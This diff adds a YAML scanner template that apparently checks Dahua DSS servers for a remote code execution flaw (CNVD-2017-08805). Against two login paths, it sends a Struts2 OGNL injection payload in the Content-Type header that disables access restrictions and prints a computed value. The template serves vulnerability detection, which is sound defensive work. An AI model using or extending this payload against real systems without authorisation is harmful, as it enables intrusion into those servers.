@@ -1,0 +1,19 @@
+id: yaml-poc-dahuatech-dss-rce-CNVD-2017-08805
+info:
+  name: Yaml Poc Dahuatech Dss Rce Cnvd 2017 08805
+  author: haiqing.chen
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-dahuatech-dss-rce-CNVD-2017-08805'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /admin/login_login.action
+  headers:
+    Content-Type: '%{(#n=''multipart/form-data'').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}+{{r2}})).(#o.close())}'
+- method: POST
+  path:
+  - /portal/login_init.action
+  headers:
+    Content-Type: '%{(#n=''multipart/form-data'').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{r1}}+{{r2}})).(#o.close())}'
